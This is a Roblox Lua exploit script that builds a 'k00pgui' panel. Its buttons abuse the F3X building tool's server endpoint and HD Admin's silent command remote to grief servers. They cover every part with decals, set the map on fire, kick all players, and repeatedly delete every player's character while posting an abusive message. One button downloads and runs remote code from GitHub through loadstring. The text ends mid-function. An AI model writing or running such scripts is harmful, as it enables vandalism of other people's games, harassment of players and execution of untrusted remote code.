
game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "credits to @noname",
Text = "for making the realm make sure to sub to his yt @k00previvai", 
Duration = 8 
})--// k00pgui Layout Only (Full Lua)
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "k00pgui"
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

-- Main draggable frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "Main"
mainFrame.Size = UDim2.new(0, 350, 0, 320)
mainFrame.Position = UDim2.new(1, -360, 0.5, -160) -- right side
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = gui

-- Function to connect button with callback
local function setupButton(button, callback)
    button.MouseButton1Click:Connect(function()
        if callback then
            callback()
        else
            print("Clicked:", button.Name)
        end
    end)
end

-- Small R6 button
local r6Btn = Instance.new("TextButton")
r6Btn.Name = "R6Button"
r6Btn.Size = UDim2.new(0, 44, 0, 22)
r6Btn.Position = UDim2.new(0, 8, 0, 6)
r6Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
r6Btn.BorderSizePixel = 0
r6Btn.Text = "R6"
r6Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
r6Btn.Font = Enum.Font.SourceSansBold
r6Btn.TextScaled = true
r6Btn.Parent = mainFrame
setupButton(r6Btn, function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";r6")
end)

-- Play Theme button (top right)
local themeBtn = Instance.new("TextButton")
themeBtn.Name = "ThemeButton"
themeBtn.Size = UDim2.new(0, 120, 0, 22)
themeBtn.Position = UDim2.new(1, -128, 0, 6)
themeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
themeBtn.BorderSizePixel = 0
themeBtn.Text = "Play k00ps theme"
themeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
themeBtn.Font = Enum.Font.SourceSansBold
themeBtn.TextScaled = true
themeBtn.Parent = mainFrame
setupButton(themeBtn, function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 1839246711")
SilentRequest:InvokeServer(";pitch 0.9")
SilentRequest:InvokeServer(";volume inf")
end)

-- Get Btools button (under theme)
local btoolsBtn = Instance.new("TextButton")
btoolsBtn.Name = "BtoolsButton"
btoolsBtn.Size = UDim2.new(0, 90, 0, 22)
btoolsBtn.Position = UDim2.new(1, -98, 0, 32)
btoolsBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
btoolsBtn.BorderSizePixel = 0
btoolsBtn.Text = "Get Btools"
btoolsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
btoolsBtn.Font = Enum.Font.SourceSansBold
btoolsBtn.TextScaled = true
btoolsBtn.Parent = mainFrame
setupButton(btoolsBtn, function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";btools me")
end)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 4)
title.BackgroundTransparency = 1
title.Text = "k00pgui"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = mainFrame

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 20)
subtitle.Position = UDim2.new(0, 0, 0, 34)
subtitle.BackgroundTransparency = 1
subtitle.Text = " F3X By ANGira"
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.TextScaled = true
subtitle.Font = Enum.Font.SourceSans
subtitle.Parent = mainFrame

-- Scrollable area
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "ScrollArea"
scrollFrame.Size = UDim2.new(1, -10, 1, -60)
scrollFrame.Position = UDim2.new(0, 5, 0, 60)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
scrollFrame.ScrollBarThickness = 6
scrollFrame.BackgroundTransparency = 1
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.Parent = scrollFrame

-- function to make rows of buttons with callbacks
local function makeRow(buttons)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 40)
    row.BackgroundTransparency = 1
    row.Parent = scrollFrame

    local rowLayout = Instance.new("UIListLayout")
    rowLayout.FillDirection = Enum.FillDirection.Horizontal
    rowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    rowLayout.Padding = UDim.new(0, 6)
    rowLayout.Parent = row

    for _, info in ipairs(buttons) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 105, 1, 0)
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        btn.BorderSizePixel = 0
        btn.Text = info.Name
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.SourceSansBold
        btn.Parent = row

        btn.MouseButton1Click:Connect(function()
            if info.Callback then
                info.Callback()
            else
                print("Clicked:", info.Name)
            end
        end)
    end
end

-- Main button rows
makeRow({
    {Name = "Decal", Callback = function() local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("9422866248") end},
    {Name = "SkyBox", Callback = function() local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

    remote:InvokeServer(unpack(args))

end

function CreatePart(cf, parent)

    _( {"CreatePart", "Normal", cf, parent} )

end

function SetAnchor(part, state)

    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )

end

function AddMesh(part)

    _( {"CreateMeshes", { {["Part"] = part} }} )

end

function SetMesh(part, meshid)

    _( {"SyncMesh", { {["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid} }} )

end

function SetTexture(part, texid)

    _( {"SyncMesh", { {["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid} }} )

end

function MeshResize(part, size)

    _( {"SyncMesh", { {["Part"] = part, ["Scale"] = size} }} )

end

function Sky(id)

    local hrp = char:WaitForChild("HumanoidRootPart")

    local cf = hrp.CFrame

    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    for _, v in workspace:GetDescendants() do

        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then

            SetAnchor(v, true)

            AddMesh(v)

            SetMesh(v, "111891702759441")

            SetTexture(v, id)

            MeshResize(v, Vector3.new(8000, 8000, 8000))

        end

    end

end

Sky("9422866248") end},
    {Name = "Hint", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";serverhint Team K00pkidd HAS HAX DIS GAME!") end}
})

makeRow({
    {Name = "Particles", Callback = function() local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

for i, v in game.ReplicatedStorage:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

local remote = tool.SyncAPI.ServerEndpoint  

function _(args)  
    remote:InvokeServer(unpack(args))  
end  

function SetCollision(part, boolean)  
    local args = {  
        [1] = "SyncCollision",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CanCollide"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function SetAnchor(boolean, part)  
    local args = {  
        [1] = "SyncAnchor",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Anchored"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function CreatePart(cf, parent)  
    local args = {  
        [1] = "CreatePart",  
        [2] = "Normal",  
        [3] = cf,  
        [4] = parent  
    }  
    _(args)  
end  

function Resize(part, size, cf)  
    local args = {  
        [1] = "SyncResize",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CFrame"] = cf,  
                ["Size"] = size  
            }  
        }  
    }  
    _(args)  
end  

function AddDecal(part, asset, side)  
    local args = {  
        [1] = "SyncTexture",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal",  
                ["Texture"] = "rbxassetid://" .. asset  
            }  
        }  
    }  
    _(args)  
end  

function SpawnDecal(part, side)  
    local args = {  
        [1] = "CreateTextures",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal"  
            }  
        }  
    }  
    _(args)  
end  

function SetName(part, stringg)  
    local args = {  
        [1] = "SetName",  
        [2] = {  
            [1] = workspace.Part  
        },  
        [3] = stringg  
    }  
    _(args)  
end  

function SetTrans(part, int)  
    local args = {  
        [1] = "SyncMaterial",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Transparency"] = int  
            }  
        }  
    }  
    _(args)  
end  

local function delete(part)  
    local args = {  
        [1] = "Remove",  
        [2] = {  
            [1] = part  
        }  
    }  
    remote:InvokeServer(unpack(args))  
end  

local function particleEffect(textureId)
    while true do
        task.wait(0.1)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local x = hrp.Position.X + math.random(-60, 60)
            local z = hrp.Position.Z + math.random(-60, 60)
            local y = hrp.Position.Y - 50
            local spawnPosition = CFrame.new(x, y, z)

            task.spawn(function()
                CreatePart(spawnPosition, workspace)
                task.wait(0.1)

                for _, v in workspace:GetChildren() do
                    if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
                        local part = v
                        SetName(part, "particle")
                        Resize(part, Vector3.new(6, 6, 0.001), part.CFrame)
                        SetCollision(part, false)
                        SetTrans(part, 1)
                        SetAnchor(true, part)
                        part.Orientation = Vector3.new(0, 0, 0)

                        SpawnDecal(part, Enum.NormalId.Front)
                        AddDecal(part, textureId, Enum.NormalId.Front)
                        SpawnDecal(part, Enum.NormalId.Back)
                        AddDecal(part, textureId, Enum.NormalId.Back)

                        local up = 90
                        for i = 2, up do
                            if part and part.Parent then
                                local newCF = part.CFrame + Vector3.new(0, 2, 0)
                                Resize(part, part.Size, newCF)
                                task.wait(0.01)
                            end
                        end

                        delete(part)
                        break
                    end
                end
            end)
        else
            task.wait(1)
        end
    end
end

local textures = {
    "90174292761643",
}

for _, texId in ipairs(textures) do
    coroutine.wrap(function()
        particleEffect(texId)
    end)()
end end},
    {Name = "666", Callback = function() local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("you dont have f3x skid")
end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function name(part, stringa)
	local args = {"SetName", {part}, stringa}
	serverendpoint:InvokeServer(unpack(args))
end

local function lock(part, boolean)
	local args = {"SetLocked", {part}, boolean}
	serverendpoint:InvokeServer(unpack(args))
end

local function createdecal(part, side)
	local args = {
		"CreateTextures",
		{
			{
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal"
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function setdecal(part, asset, side)
	local args = {
		"SyncTexture",
		{
			{
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal",
				["Texture"] = "rbxassetid://".. asset
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function color(part, color)
	local args = {
		"SyncColor",
		{
			{
				["Part"] = part,
				["Color"] = color,
				["UnionColoring"] = false
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function addfire(part)
	local args = {
		"CreateDecorations",
		{
			{
				["Part"] = part,
				["DecorationType"] = "Fire"
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function syncfire(part, size, heat)
	local args = {
		"SyncDecorate",
		{
			{
				["Part"] = part,
				["DecorationType"] = "Fire",
				["Size"] = size or 30,
				["Heat"] = heat or 35
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function addlight(part)
	local args = {
		"CreateLights",
		{
			{
				["Part"] = part,
				["LightType"] = "PointLight"
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function synclight(part, brightness)
	local args = {
		"SyncLighting",
		{
			{
				["Part"] = part,
				["LightType"] = "PointLight",
				["Brightness"] = brightness,
				["Color"] = Color3.new(1, 0, 0)
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function setcollision(part, booleana)
	local args = {
		"SyncCollision",
		{
			{
				["Part"] = part,
				["CanCollide"] = booleana
			}
		}
	}
	serverendpoint:InvokeServer(unpack(args))
end

local function decalspam()
	local decalid = "96757457442198"
	for _, v in ipairs(workspace:GetDescendants()) do
		if v.Name == "Sky" then
			print("no")
		elseif v:IsA("BasePart") or v:IsA("UnionOperation") then
			spawn(function()
				createdecal(v, Enum.NormalId.Front)
				createdecal(v, Enum.NormalId.Back)
				createdecal(v, Enum.NormalId.Left)
				createdecal(v, Enum.NormalId.Right)
				createdecal(v, Enum.NormalId.Bottom)
				createdecal(v, Enum.NormalId.Top)

				setdecal(v, decalid, Enum.NormalId.Front)
				setdecal(v, decalid, Enum.NormalId.Back)
				setdecal(v, decalid, Enum.NormalId.Left)
				setdecal(v, decalid, Enum.NormalId.Right)
				setdecal(v, decalid, Enum.NormalId.Bottom)
				setdecal(v, decalid, Enum.NormalId.Top)
			end)
		end
	end
end

local function lightall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") then
			spawn(function()
				addlight(v)
				synclight(v, 15)
			end)
		end
	end
end

local function colorall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") then
			spawn(function()
				color(v, Color3.new(0.0666667, 0.0666667, 0.0666667))
			end)
		end
	end
end

local function fireall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") then
			spawn(function()
				addfire(v)
				syncfire(v)
			end)
		end
	end
end

-- removed sky666(), everything else intact
local function sixsixsix()
	fireall()
	decalspam()
	colorall()
	lightall()
end

sixsixsix() end},
    {Name = "Kick em all", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";kick all k00pkidd hax dis game") end}
})

makeRow({
    {Name = "Become Thomas", Callback = function() local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("you dont have f3x skid")
	return
end

local syncapi = f3x:WaitForChild("SyncAPI")
local serverendpoint = syncapi:WaitForChild("ServerEndpoint")

-- helper funcs
local function makemesh(part)
	local args = {"CreateMeshes", {{["Part"] = part}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function syncmeshtexture(part, id)
	local args = {"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://"..id}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function synctrans(part, int)
	local args = {"SyncMaterial", {{["Part"] = part, ["Transparency"] = int}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function syncmeshsize(part, vectora)
	local args = {"SyncMesh", {{["Part"] = part, ["Scale"] = vectora}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function setcollision(part, booleana)
	local args = {"SyncCollision", {{["Part"] = part, ["CanCollide"] = booleana}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function syncmeshid(part, id)
	local args = {"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..id}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function weld(p1, p2, lead)
	local args = {"CreateWelds", {p1, p2}, lead}
	serverendpoint:InvokeServer(unpack(args))
end

local function name(part, stringa)
	local args = {"SetName", {part}, stringa}
	serverendpoint:InvokeServer(unpack(args))
end

local function setanchor(part, boolean)
	local args = {"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function resize(part, size, cf)
	local args = {"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}}
	serverendpoint:InvokeServer(unpack(args))
end

local function delete(part)
	local args = {"Remove", {part}}
	serverendpoint:InvokeServer(unpack(args))
end

-- hide char
for _, v in ipairs(char:GetChildren()) do
	if v:IsA("BasePart") or v:IsA("MeshPart") then
		spawn(function()
			synctrans(v, 1)
		end)
	end
end

task.wait(1)

spawn(function()
	local hrp = char:WaitForChild("HumanoidRootPart")
	local trainpart = serverendpoint:InvokeServer("CreatePart", "Normal", hrp.CFrame, char)

	name(trainpart, "sigmatrain")
	setcollision(trainpart, false)
	resize(trainpart, Vector3.new(5,5,10), hrp.CFrame)
	weld(trainpart, hrp, trainpart)
	makemesh(trainpart)
	syncmeshsize(trainpart, Vector3.new(2,2,1.5))
	syncmeshid(trainpart, "2231280549")
	syncmeshtexture(trainpart, "2231280614")

	task.wait(1)
	setanchor(trainpart, false)

	-- Light effect
	local headlight = Instance.new("SpotLight")
	headlight.Brightness = 4
	headlight.Angle = 90
	headlight.Range = 25
	headlight.Face = Enum.NormalId.Front
	headlight.Color = Color3.fromRGB(255, 255, 200)
	headlight.Parent = trainpart

	char.Humanoid.WalkSpeed = 60

	trainpart.Touched:Connect(function(p)
		if p.Parent and p.Parent:FindFirstChildOfClass("Humanoid") and p.Parent ~= char then
			if p.Parent:FindFirstChild("Head") then
				delete(p.Parent.Head)
			end
		end
	end)
end) end},
    {Name = "k00pkidd's realm", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxCheat3rXD/Vre/refs/heads/main/k00pkidd_f3x_realm.txt"))() end},
    {Name = "Toadroast", Callback = function() --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- Rain Toad F3X (Better) Script By ItsKittyyyGD
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 153752123")
SilentRequest:InvokeServer(";volume inf")

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end

function SetAnchor(boolean, part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function Resize(part, size, cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = workspace.Part
        },
        [3] = stringg
    }
    _(args)
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(true, v)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            MeshResize(v, Vector3.new(8000, 8000, 8000))
        end
    end
end

local function createRainToads()
    while true do
        wait(0.3)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrpcf = player.Character.HumanoidRootPart.CFrame
            local x = hrpcf.x
            local z = hrpcf.z
            local randint = math.random(-600, 600)
            local randint2 = math.random(-600, 600)
            local xloc = randint + x
            local zloc = randint2 + z
            local cf = player.Character.HumanoidRootPart.CFrame.y + 800  

            spawn(function()
                local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
                for i, v in game.Workspace:GetDescendants() do
                    if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
                        SetName(v, "MiniToad")
                        SetAnchor(false, v)
                        AddMesh(v)
                        
                        SetMesh(v, "7234998844")
                        SetTexture(v, "1009824086")
                        SetCollision(v, false)
                        v.Orientation = Vector3.new(0, 0, 0)

                        local sound = Instance.new("Sound", v)
                        sound.SoundId = "rbxassetid://153752123"
                        sound.Volume = 10
                        sound.PlayOnRemove = true
                        sound:Destroy()
                    end
                end
            end)
        else
            wait(1)
        end
    end
end

coroutine.wrap(createRainToads)()

Sky("201208408")
local player = game.Players.LocalPlayer
local char = player.Character
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

function Punish(player)
    local char = player.Character
    DestroyPart(char)
end

coroutine.wrap(function()
    while true do
        for i, v in game.Players:GetPlayers() do
            pcall(function()
                Punish(v)
            end)
        end
        task.wait(0.0)
    end
end)()

local msg = coroutine.create(function()
    while task.wait(0.4) do
        local msgInstance = Instance.new("Message", workspace)
        msgInstance.Text = "Get Toadroasted by k00pkidd bitch"
        task.wait(0.4)
        msgInstance:Destroy()
    end
end)

coroutine.resume(msg) end}
})

makeRow({
    {Name = "UnAnchor", Callback = function() local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

if not tool or not tool:FindFirstChild("SyncAPI") then

	warn("SyncAPI tool not found!")

	return

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{

			part

		}

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{

				Part = part

			}

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{

			part

		},

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{

			part1,

			part2

		},

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{

			part

		},

		boolean

	}

	_(args)

end

function SetTrans(part, int)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = int

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

